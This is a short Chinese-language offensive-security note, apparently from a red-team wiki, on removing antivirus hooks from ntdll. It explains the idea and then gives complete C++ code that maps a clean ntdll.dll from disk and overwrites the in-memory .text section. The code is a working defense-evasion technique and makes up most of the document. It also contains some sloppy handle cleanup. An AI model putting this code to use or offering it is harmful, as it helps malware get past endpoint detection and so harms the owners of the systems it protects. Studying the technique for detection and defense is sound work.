# 重新加载.text节拖钩

## 简介

以前简单介绍过[inline hook](../persistence/detous-inline-hook.md)，杀软会对ntdll进入内核的函数进行挂钩，从而实现检测和阻止，这篇文章主要是对实现过程中遇到的一些小坑进行记录，mantvydasb师傅已经对这种技术有详尽的解释，并没有什么特别复杂的操作，只是把ntdll的.text\(代码节\)进行了读取覆盖。

## 流程

1. 读取ntdll进内存
2. 读取覆盖.text节

## 代码

代码是对mantvydasb师傅拙劣的模仿

```text
#include <Windows.h>
#include <psapi.h>

int main()
{
	MODULEINFO mInfo = { 0 };
	HANDLE hProcess = GetCurrentProcess();

	//get address of ntdll in virtual memory 
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	GetModuleInformation(hProcess, hNtdll, &mInfo, sizeof(mInfo));
	LPVOID lpNtdllbase = (LPVOID)mInfo.lpBaseOfDll;
	
	HANDLE hNtdllfile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE hNtdllMapping = CreateFileMapping(hNtdllfile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER pDosheader = (PIMAGE_DOS_HEADER)lpNtdllbase;
	PIMAGE_NT_HEADERS pNtheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpNtdllbase + pDosheader->e_lfanew);

	for (WORD i = 0; i < pNtheader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionheader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtheader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)pSectionheader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader->VirtualAddress), pSectionheader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader->VirtualAddress), (LPVOID)((DWORD_PTR)lpNtdllmaping + (DWORD_PTR)pSectionheader->VirtualAddress), pSectionheader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)lpNtdllbase + (DWORD_PTR)pSectionheader->VirtualAddress), pSectionheader->Misc.VirtualSize, oldProtection, NULL);
		}
	}

	CloseHandle(hProcess);
	CloseHandle(hNtdllfile);
	CloseHandle(lpNtdllmaping);
	FreeLibrary(hNtdll);

	return 0;
}
```

## LINKS

{% embed url="https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++" %}



